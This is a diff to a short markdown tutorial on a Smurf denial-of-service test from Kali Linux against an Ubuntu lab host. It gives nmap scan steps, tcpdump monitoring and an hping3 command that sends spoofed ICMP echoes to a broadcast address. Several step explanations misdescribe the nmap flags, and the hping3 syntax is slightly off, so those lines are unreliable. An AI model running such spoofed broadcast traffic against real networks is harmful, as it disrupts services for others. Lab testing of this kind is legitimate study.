@@ -1,8 +1,13 @@
-https://www.secuneus.com/smurf-dos-testing-ubuntu-using-kali-linux-hping3/
+# SMURF DOS TESTING UBUNTU USING HPING3
+
+A smurf attack is historically one of the oldest techniques to perform a distributed denial-of-service (DDoS) amplification attack. This attack consists of sending a series of ICMP echo requests with a spoofed source IP address to the network broadcast address. When this echo request is broadcast, all hosts on the LAN should simultaneously reply to the target for each spoofed request received. This technique is less effective against modern systems, as most will not reply to IP-directed broadcast traffic.
 
 Step 1: In kali type command  $nmap 196.168.176.129 (Target’s IP address i.e. Ubuntu)
 Step 2: $nmap -sP  196.168.176.129  (Run a fast scan on the target system, but bypass host discovery.)
 Step 3: $nmap -Pn  -sP  196.168.176.129   (The nmap utility can be used to detect the operating system of a particular target)
 Step 4: $ping 196.168.176.129 
 Step 5: (In Ubuntu System)    $sudo tcpdump -i ens33
-Step 6:(In Kali) $hping3 –icmp -c 1 spoof  196.168.176.129  196.168.176.255.
+Step 6:(In Kali) $hping3 –icmp -c 1 spoof  196.168.176.129  196.168.176.255
+
+
+https://www.secuneus.com/smurf-dos-testing-ubuntu-using-kali-linux-hping3/
